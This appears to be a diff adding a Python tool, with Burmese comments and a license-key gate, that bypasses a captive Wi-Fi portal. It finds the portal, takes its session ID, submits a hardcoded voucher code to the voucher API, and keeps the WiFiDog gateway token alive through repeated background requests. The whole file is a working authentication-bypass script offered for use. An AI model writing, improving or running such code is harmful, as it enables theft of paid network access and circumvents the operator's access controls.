@@ -1,0 +1,81 @@
+import requests, re, urllib3, time, threading, os, socket, datetime
+from urllib.parse import urlparse, parse_qs, urljoin
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# --- KEY SYSTEM SETTINGS ---
+# Ko ရဲ့ Key တွေကို GitHub Gist ဒါမှမဟုတ် Direct Link တစ်ခုခုမှာ သိမ်းထားလို့ရပါတယ်
+# အခုလောလောဆယ် Local မှာ Key ဖိုင်တစ်ခု အရင်ဆောက်ထားပါမယ်
+KEY_FILE = "keys.txt" 
+
+def check_key():
+    os.system('clear')
+    print("\033[95m" + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[95m   🔑  MLBB V12 KEY SYSTEM")
+    print("\033[95m" + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
+    
+    user_key = input("\n\033[96m[?] Enter Your Key: \033[0m").strip()
+    
+    # Key စစ်တဲ့နေရာမှာ ကြာမနေအောင် အမြန်လုပ်ဆောင်ခြင်း
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, "r") as f:
+            keys = f.readlines()
+            for line in keys:
+                k, expiry = line.strip().split("|")
+                if user_key == k:
+                    expiry_date = datetime.datetime.strptime(expiry, "%Y-%m-%d %H:%M")
+                    if datetime.datetime.now() < expiry_date:
+                        print(f"\033[92m[✓] Key Valid! Expires on: {expiry}\033[0m")
+                        time.sleep(1)
+                        return True
+                    else:
+                        print("\033[91m[!] Key Expired!\033[0m")
+                        return False
+    
+    print("\033[91m[!] Invalid Key or No Internet Connection.\033[0m")
+    return False
+
+# --- STARLINK ENGINE ---
+GAME_UA = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
+
+def immortal_pulse(auth_link, session):
+    while True:
+        try:
+            session.get(auth_link, timeout=3, headers={"User-Agent": GAME_UA})
+            socket.gethostbyname("1.1.1.1")
+            time.sleep(0.3) 
+        except:
+            time.sleep(1)
+
+def start_engine():
+    main_session = requests.Session()
+    print("\033[94m[*] Scanning for Starlink Portal...\033[0m")
+    
+    while True:
+        try:
+            r = main_session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
+            if r.status_code != 204:
+                print("\033[93m[!] Portal Found! Bypassing now...\033[0m")
+                p_url = r.url
+                r1 = main_session.get(p_url, timeout=5)
+                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+                n_url = urljoin(p_url, match.group(1)) if match else p_url
+                r2 = main_session.get(n_url, timeout=5)
+                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+
+                if sid:
+                    p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
+                    main_session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid}, timeout=5)
+                    gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
+                    port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
+                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
+                    print("\033[92m[✓] BYPASS SUCCESS!\033[0m")
+                    for _ in range(3):
+                        threading.Thread(target=immortal_pulse, args=(auth_link, main_session), daemon=True).start()
+            time.sleep(10)
+        except:
+            time.sleep(5)
+
+if __name__ == "__main__":
+    if check_key():
+        start_engine()
